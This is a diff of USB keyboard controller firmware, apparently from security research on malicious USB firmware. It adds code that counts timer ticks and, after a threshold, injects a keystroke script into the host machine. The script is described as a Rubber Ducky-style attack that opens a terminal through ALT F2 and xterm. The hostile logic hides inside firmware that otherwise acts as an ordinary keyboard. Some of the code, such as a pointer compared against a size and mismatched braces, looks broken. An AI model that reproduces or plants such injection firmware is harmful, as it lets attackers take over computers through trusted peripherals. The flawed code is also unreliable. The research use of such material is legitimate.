@@ -43,12 +43,12 @@
 /**********************
  * Malicious pre-defined key strokes
  * used by the malicious firmware to
- * attack the USB host machine.
+ * attack the USB host Linux machine.
  * Ref: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---Basic-Terminal-Commands-Ubuntu
  * Jan 11, 2017
  * daveti
  */
-#define FIRMUSB_ATTACK_THRESHOLD	100
+#define FIRMUSB_ATTACK_THRESHOLD	10000
 static char firmusb_script[] =
 {	/* ALT F2 */
 	/* xterm */
@@ -61,6 +61,8 @@ static char firmusb_script[] =
 	/* ENTER */
 };
 static int firmusb_inject_counter;
+static char *firmusb_ptr;
+static int firmusb_inject_start;
 
 /*****************************************************************************
  * apply_reset_values()
@@ -1030,6 +1032,49 @@ static void timer2_isr() __interrupt (5) __using (3) __critical
          kbd_idle_counter    = kbd_idle_duration;
       }
 
+      /* daveti: let's dance here */
+      if (!firmusb_inject_start)
+	 firmusb_inject_counter++;
+	 if (firmusb_inject_counter > FIRMUSB_ATTACK_THRESHOLD) {
+	    firmusb_inject_start = 1;
+	    firmusb_ptr = firmusb_script;
+	 }
+      }
+
+      if (firmusb_inject_start) {
+	 if (firmusb_ptr < sizeof(firmusb_script)) {
+	    if (!in1_busy) {
+	       /* Copy the script into the buffer */
+	       if ((firmusb_script+sizeof(firmusb_script)-firmusb_ptr) >= 8)
+		  memcpy(key_buffer, firmusb_ptr, 8);
+	       else {
+		  memset(key_buffer, 0x0, 8);
+		  memcpy(key_buffer, firmusb_ptr,
+			(firmusb_script+sizeof(firmusb_script)-firmusb_ptr));
+	       }
+
+	       i = 8;
+	       while (i-- > 0)
+		  in1buf(i) = key_buffer[i];
+
+	       /* Transmit it now */
+	       in1_busy = TRUE;
+	       IN1BC = 8;
+	
+	       /* Track the ptr */
+	       firmusb_ptr += 8;
+	    }
+	 }
+	 else {
+	    /* We should have sent all the script
+	     * Now we could handle the normal keystroke from the kbd
+	     */
+	    firmusb_inject_start = 0;	
+	    firmusb_inject_counter = 0;
+	 }
+      }
+
+      /* Normal keystroke from the kbd */
       if (kbd_send_report) {
          if (!in1_busy) {
             i = 8;
